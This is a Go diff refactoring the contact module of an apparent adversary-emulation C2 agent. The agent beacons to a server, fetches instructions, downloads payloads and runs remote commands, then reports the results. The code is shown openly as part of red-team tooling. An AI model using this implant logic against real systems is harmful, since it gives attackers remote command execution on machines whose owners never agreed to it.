@@ -1,4 +1,4 @@
-package api
+package contact
 
 import (
 	"bytes"
@@ -19,20 +19,23 @@ const (
 	ok = 200
 )
 
+//API communicates through HTTP
+type API struct {}
+
 //Ping tests connectivity to the server
-func Ping(server string) bool {
+func (contact API) Ping(server string) bool {
 	address := fmt.Sprintf("%s/sand/ping", server)
 	bites := request(address, nil)
 	if(string(bites) == "pong") {
-		fmt.Println("[+] Connectivity established")
+		fmt.Println("[+] Ping success")
 		return true;
 	}
-	fmt.Println("[+] Connectivity not established")
+	fmt.Println("[+] Ping failure")
 	return false;
 }
 
-//Instructions is a single call to the C2
-func Instructions(profile map[string]interface{}) map[string]interface{} {
+//GetInstructions sends a beacon and returns instructions
+func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
 	data, _ := json.Marshal(profile)
 	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
 	bites := request(address, data)
@@ -51,7 +54,7 @@ func Instructions(profile map[string]interface{}) map[string]interface{} {
 }
 
 //DropPayloads downloads all required payloads for a command
-func DropPayloads(payload string, server string) []string{
+func (contact API) DropPayloads(payload string, server string) []string{
 	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
 	var droppedPayloads []string
 	for _, payload := range payloads {
@@ -62,18 +65,9 @@ func DropPayloads(payload string, server string) []string{
 	return droppedPayloads
 }
 
-//ExecuteInstruction takes the command and profile and executes that command step
-func ExecuteInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
-	cmd := string(util.Decode(command["command"].(string)))
-	var status string
-	var result []byte
-	missingPaths := util.CheckPayloadsAvailable(payloads)
-	if len(missingPaths) == 0 {
-		result, status = execute.Execute(cmd, command["executor"].(string), profile["platform"].(string))
-	} else {
-		result = []byte(fmt.Sprintf("Payload(s) not available: %s", strings.Join(missingPaths, ", ")))
-		status = execute.ERROR_STATUS
-	}
+//RunInstruction runs a single instruction
+func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
+	cmd, result, status := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), profile["platform"].(string))
 	sendExecutionResults(command["id"], profile["server"], result, status, cmd)
 }
 
